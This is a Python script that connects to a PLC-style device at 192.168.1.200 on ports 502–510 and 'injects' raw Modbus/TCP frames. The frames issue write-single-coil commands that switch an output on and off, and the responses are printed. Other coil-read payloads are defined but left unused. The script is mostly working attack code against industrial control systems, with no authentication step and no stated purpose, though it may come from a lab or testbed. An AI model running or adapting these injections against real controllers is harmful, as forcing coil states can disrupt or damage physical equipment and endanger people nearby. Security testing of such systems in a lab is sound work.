#from scapy import all as scapy
#import pymodbus
import socket
import time
import sys

def inject (payload, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect (('192.168.1.200', port))

		s.send(payload)

		res = s.recv(900) # buffer

		print(res)

		s.close()

	except:
		print('TCP Connection on port '+ str(port) +' refused')
		return 0
	return res

def payload ():
	r = [
		b"\x00\x37\x00\x00\x00\x06\x01\x05\x00\x51\xff\x00",
		b"\x00\x37\x00\x00\x00\x06\x01\x05\x00\x51\x00\x00",

		]
	return r

resault = []


payload1 = b'\x00\x3c\x00\x00\x00\x06\x01\x05\x00\xa1\x00\x00'
payload2 = b"\x00\x36\x00\x00\x00\x06\x01\x01\x01\x08\x00\x08"
#              				   \
payload3 = b"\x00\x00\x00\x00\x00\x06\x01\x01\x01\x08\x00\x08"
payload4 = b"\x00\x00\x00\x00\x00\x06\x00\x01\x00\x00\x00\x00"




payload51 = b"\x00\x00\x00\x00\x00\x06\x00"

# payload52 generated

payload53 = b"\x00\x00\x00\x00"
#f_code = [b"\x99", b"\x20", b"\xb2", b"\xff", b"\xb3"]
f_code = [b"\x01", b"\x02", b"\x03", b"\x04", b"\x05"]

payload5 = payload()


ports = [500, 502, 503, 506]

for port in range(502,511):
	print(port)
	print('---')
	for pay in payload5:
		temp = inject(pay, port)
		if temp == 0:
			break;
		resault.append('Port ' +  str(port) + ' retrns : ' + str(temp))
		time.sleep(1)
	time.sleep(1)


for res in resault:
	print(res)







